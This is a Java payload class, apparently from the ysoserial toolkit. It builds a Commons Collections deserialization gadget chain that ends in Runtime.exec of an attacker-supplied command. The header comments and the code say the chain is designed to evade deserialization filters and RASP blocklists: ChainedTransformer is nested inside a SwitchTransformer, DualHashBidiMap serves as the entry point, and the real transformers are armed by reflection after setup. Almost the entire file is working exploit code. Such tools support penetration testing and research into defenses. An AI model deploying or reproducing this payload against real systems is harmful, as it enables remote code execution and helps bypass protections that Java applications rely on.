package ysoserial.payloads;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Predicate;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.SwitchTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.bidimap.DualHashBidiMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	SwitchTransformer as ChainedTransformer bypass.

	Many deserialization filters and RASP solutions blocklist ChainedTransformer
	by class name, or check that LazyMap.factory is not a ChainedTransformer.
	This chain wraps ChainedTransformer inside a SwitchTransformer, so:
		- LazyMap.factory = SwitchTransformer (NOT ChainedTransformer)
		- Filters checking LazyMap.factory class name miss this
		- ChainedTransformer is nested inside SwitchTransformer.iDefault

	Combined with DualHashBidiMap entry for double evasion:
		- Entry point: DualHashBidiMap (not in any filter)
		- Factory: SwitchTransformer (not ChainedTransformer)

	Gadget chain:
		ObjectInputStream.readObject()
			DualHashBidiMap.readObject()
				HashMap.put(key, value)
					key.hashCode()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									SwitchTransformer.transform()
										iDefault.transform()    // iDefault = ChainedTransformer
											InvokerTransformer.transform()
												Method.invoke()
													Runtime.exec()

	Filter evasion:
		1. DualHashBidiMap entry — not in any known filter
		2. SwitchTransformer factory — ChainedTransformer not directly
		   referenced from LazyMap, bypasses paired class checks
		3. SwitchTransformer itself is never in any blocklist

	Discovered by web-fuzzer automated gadget chain analysis (9-hour session).
	32 findings using SwitchTransformer as ChainedTransformer bypass.

	Requires:
		commons-collections 3.1+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class CommonsCollections33 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		final String[] execArgs = new String[] { command };

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer innerChain = new ChainedTransformer(fakeTransformers);

		// Real transformers to arm later
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		// SwitchTransformer wrapping ChainedTransformer as iDefault.
		// Empty predicates array → transform() always falls through to iDefault.
		// LazyMap.factory = SwitchTransformer, NOT ChainedTransformer.
		SwitchTransformer switchTransformer = new SwitchTransformer(
			new Predicate[0],
			new Transformer[0],
			innerChain
		);

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, switchTransformer);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// DualHashBidiMap as entry gadget (double evasion)
		DualHashBidiMap bidi = new DualHashBidiMap();
		bidi.put(entry, "bar");

		// Remove cached entry
		innerMap.remove("foo");

		// Arm the inner chain
		Reflections.setFieldValue(innerChain, "iTransformers", realTransformers);

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections33.class, args);
	}
}
